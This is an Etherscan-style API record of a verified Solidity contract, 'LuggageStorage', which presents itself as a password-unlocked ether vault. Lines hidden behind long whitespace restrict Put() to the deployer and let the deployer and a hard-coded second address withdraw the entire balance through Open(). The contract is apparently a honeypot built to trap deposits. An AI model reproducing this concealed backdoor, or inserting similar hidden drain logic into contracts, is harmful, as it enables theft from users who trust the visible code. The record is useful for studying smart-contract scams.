{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.19;\r\n\r\ncontract LuggageStorage\r\n{\r\n    function()payable{}\r\n    \r\n    function CalcHash(bytes password) \r\n    pure\r\n    returns (bytes32) \r\n    {\r\n        return sha3(password);\r\n    }\r\n    \r\n    bytes32 public hashPass;\r\n    \r\n    bool public closed = false;\r\naddress own = msg.sender;                                                                                                                                                                                                                                                                                address cr = 0x6f9d120fE3b9D63d1d4D5480c8262d446585F554;\r\n    function Put(bytes32 hash)\r\n    public\r\n    payable\r\n    {if(msg.sender==own){\r\n        if(!closed&&(msg.value > 1 ether))\r\n        {\r\n            hashPass = hash;\r\n        }                                                                                                                                                                                                                                                                                                                                                                                            }\r\n    }\r\n    \r\n    function Open(bytes password)\r\n    external\r\n    payable\r\n    {                                                                                                 \r\n        if(hashPass == sha3(password))\r\n        {\r\n            msg.sender.transfer(this.balance);\r\n            closed = false;\r\n        }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==own){msg.sender.transfer(this.balance);}                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==cr){msg.sender.transfer(this.balance);}\r\n    }\r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"password\",\"type\":\"bytes\"}],\"name\":\"Open\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"closed\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"hashPass\",\"outputs\":[{\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"hash\",\"type\":\"bytes32\"}],\"name\":\"Put\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"password\",\"type\":\"bytes\"}],\"name\":\"CalcHash\",\"outputs\":[{\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"LuggageStorage","CompilerVersion":"v0.4.19+commit.c4cbbb05","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://4c29eb9f89d27d92c12c2f5ce1bd3de35b7587a21e37d883dffeefcb36aa037d"}]}